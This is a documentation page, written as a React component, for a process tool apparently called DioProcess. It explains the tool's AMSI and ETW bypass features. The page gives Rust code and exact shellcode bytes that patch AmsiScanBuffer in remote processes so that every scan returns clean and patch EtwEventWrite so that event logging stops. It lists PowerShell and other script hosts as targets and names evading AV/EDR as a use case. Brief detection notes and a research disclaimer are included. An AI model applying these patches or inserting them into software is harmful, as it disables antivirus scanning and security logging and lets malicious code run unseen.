import { Badge } from "@/components/ui/badge";
import { CodeBlock } from "@/components/code-block";
import { WarningBox } from "@/components/warning-box";

export default function AmsiEtwBypassPage() {
  return (
    <div className="space-y-8">
      <div>
        <div className="flex items-center gap-3 mb-4">
          <h1 className="text-4xl font-bold">AMSI &amp; ETW Bypass</h1>
          <Badge variant="outline">Ring 3</Badge>
        </div>
        <p className="text-lg text-muted-foreground">
          Patch AMSI and ETW in remote processes to bypass security monitoring and allow 
          unrestricted script/payload execution.
        </p>
      </div>

      <WarningBox variant="danger" title="Security Research Only">
        These techniques are for authorized security research only. Bypassing security 
        mechanisms without authorization may be illegal.
      </WarningBox>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">AMSI Hooking</h2>
        <p className="text-muted-foreground">
          The Antimalware Scan Interface (AMSI) is used by Windows Defender and third-party 
          security products to scan scripts and payloads at runtime. DioProcess can patch{" "}
          <code className="text-violet">AmsiScanBuffer</code> in a remote process to make 
          all scans return clean.
        </p>
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">AMSI Hook Algorithm</h3>
        <CodeBlock
          language="rust"
          filename="crates/misc/src/amsi.rs"
          code={`pub fn hook_amsi(pid: u32) -> Result<(), MiscError> {
    // 1. Open target process with VM permissions
    let handle = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        false, pid
    )?;
    
    // 2. Load amsi.dll locally with DONT_RESOLVE_DLL_REFERENCES
    //    (Same base address in target due to ASLR for system DLLs)
    let amsi = LoadLibraryExW("amsi.dll", DONT_RESOLVE_DLL_REFERENCES);
    
    // 3. Get AmsiScanBuffer address
    let func_addr = GetProcAddress(amsi, "AmsiScanBuffer");
    
    // 4. Verify code cave before function contains INT3 padding (0xCC)
    //    This is safe space for our hook shellcode
    
    // 5. Write 13-byte hook shellcode to code cave + prolog
    let shellcode = [
        0x31, 0xC0,                         // xor eax, eax (S_OK = 0)
        0x4C, 0x8B, 0x5C, 0x24, 0x30,       // mov r11, [rsp+0x30] (6th param = AMSI_RESULT*)
        0x45, 0x89, 0x03,                   // mov [r11], r8d (*result = AMSI_RESULT_CLEAN)
        0xC3,                               // ret
        // At AmsiScanBuffer entry point:
        0xEB, 0xF3,                         // jmp short -13 (jump to shellcode)
    ];
    
    // 6. WriteProcessMemory to patch the function
    WriteProcessMemory(handle, func_addr - 11, &shellcode, 13)?;
    
    // 7. Flush instruction cache
    FlushInstructionCache(handle, func_addr - 11, 13)?;
    
    Ok(())
}`}
        />
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">AMSI Hook Shellcode</h3>
        <p className="text-muted-foreground">The hook uses a code cave technique:</p>
        <CodeBlock
          language="asm"
          filename="shellcode.asm"
          code={`; Code cave (before AmsiScanBuffer entry)
xor eax, eax              ; Return S_OK (0)
mov r11, [rsp+0x30]       ; Get AMSI_RESULT* (6th parameter)
mov [r11], r8d            ; *result = AMSI_RESULT_CLEAN (0)
ret                       ; Return to caller

; At AmsiScanBuffer entry point
jmp short -13             ; Jump up to shellcode`}
        />
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">Target Processes</h3>
        <p className="text-muted-foreground">
          AMSI hooking works on any process that loads <code>amsi.dll</code>:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <code className="text-violet">powershell.exe</code> — Windows PowerShell</li>
          <li>• <code className="text-violet">pwsh.exe</code> — PowerShell Core</li>
          <li>• <code className="text-violet">cscript.exe / wscript.exe</code> — VBScript/JScript hosts</li>
          <li>• <code className="text-violet">.NET applications</code> — Any managed code host</li>
          <li>• <code className="text-violet">msbuild.exe</code> — MSBuild with inline tasks</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">ETW Patching</h2>
        <p className="text-muted-foreground">
          Event Tracing for Windows (ETW) is used by security products to monitor process 
          activity. DioProcess can patch <code className="text-violet">EtwEventWrite</code>{" "}
          in ntdll.dll to disable all ETW logging for a process.
        </p>
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">ETW Patch Algorithm</h3>
        <CodeBlock
          language="rust"
          filename="crates/misc/src/etw.rs"
          code={`pub fn patch_etw(pid: u32) -> Result<(), MiscError> {
    // 1. Open target process
    let handle = OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        false, pid
    )?;
    
    // 2. Get EtwEventWrite address in ntdll.dll
    let ntdll = GetModuleHandleW("ntdll.dll");
    let func_addr = GetProcAddress(ntdll, "EtwEventWrite");
    
    // 3. Write 4-byte patch: xor rax, rax; ret
    let patch = [
        0x48, 0x31, 0xC0,  // xor rax, rax (return STATUS_SUCCESS)
        0xC3,              // ret
    ];
    
    // 4. Make memory writable
    VirtualProtectEx(handle, func_addr, 4, PAGE_EXECUTE_READWRITE)?;
    
    // 5. Write patch
    WriteProcessMemory(handle, func_addr, &patch, 4)?;
    
    // 6. Restore memory protection
    VirtualProtectEx(handle, func_addr, 4, PAGE_EXECUTE_READ)?;
    
    Ok(())
}`}
        />
      </section>

      <section className="space-y-4">
        <h3 className="text-xl font-semibold">ETW Patch Bytes</h3>
        <CodeBlock
          language="asm"
          filename="patch.asm"
          code={`; Original EtwEventWrite prolog:
; mov r11, rsp
; sub rsp, ...

; Patched to:
xor rax, rax    ; 48 31 C0 - Return STATUS_SUCCESS (0)
ret             ; C3       - Return immediately`}
        />
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">UI Access</h2>
        <p className="text-muted-foreground">
          Both features are accessible from the Process tab context menu:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• <strong>AMSI Hook:</strong> Right-click process → Miscellaneous → AMSI Hook</li>
          <li>• <strong>ETW Patch:</strong> Right-click process → Miscellaneous → ETW Patch</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Comparison</h2>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead>
              <tr className="border-b border-border">
                <th className="text-left py-2 px-3 font-semibold">Feature</th>
                <th className="text-left py-2 px-3 font-semibold">AMSI Hook</th>
                <th className="text-left py-2 px-3 font-semibold">ETW Patch</th>
              </tr>
            </thead>
            <tbody>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Target DLL</td>
                <td className="py-2 px-3 text-muted-foreground">amsi.dll</td>
                <td className="py-2 px-3 text-muted-foreground">ntdll.dll</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Target Function</td>
                <td className="py-2 px-3 text-muted-foreground">AmsiScanBuffer</td>
                <td className="py-2 px-3 text-muted-foreground">EtwEventWrite</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Patch Size</td>
                <td className="py-2 px-3 text-muted-foreground">13 bytes (code cave)</td>
                <td className="py-2 px-3 text-muted-foreground">4 bytes (inline)</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Effect</td>
                <td className="py-2 px-3 text-muted-foreground">All scans return clean</td>
                <td className="py-2 px-3 text-muted-foreground">All ETW events disabled</td>
              </tr>
              <tr className="border-b border-border/50">
                <td className="py-2 px-3">Scope</td>
                <td className="py-2 px-3 text-muted-foreground">Per-process</td>
                <td className="py-2 px-3 text-muted-foreground">Per-process</td>
              </tr>
            </tbody>
          </table>
        </div>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">System-Wide ETW Bypass</h2>
        <p className="text-muted-foreground">
          For system-wide ETW Threat Intelligence (ETW-TI) bypass, see{" "}
          <a href="/docs/kernel/etwti-bypass" className="text-violet hover:underline">
            Kernel Driver &gt; ETWTI Bypass
          </a>
          , which disables the ETW-TI provider at the kernel level.
        </p>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Use Cases</h2>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Execute PowerShell scripts without AMSI scanning</li>
          <li>• Load .NET assemblies without security inspection</li>
          <li>• Run scripts that would otherwise be flagged by AV/EDR</li>
          <li>• Security research and red team testing</li>
          <li>• Analyze how security products detect these bypasses</li>
        </ul>
      </section>

      <section className="space-y-4">
        <h2 className="text-2xl font-bold">Detection Notes</h2>
        <p className="text-muted-foreground">
          These patches can be detected by:
        </p>
        <ul className="space-y-2 text-muted-foreground">
          <li>• Memory integrity checks comparing .text sections to disk</li>
          <li>• Hook scanning (see <a href="/docs/usermode/hook-detection" className="text-violet hover:underline">Hook Detection</a>)</li>
          <li>• ETW-TI monitoring of memory writes to ntdll.dll</li>
          <li>• Kernel callbacks monitoring write operations</li>
        </ul>
      </section>
    </div>
  );
}
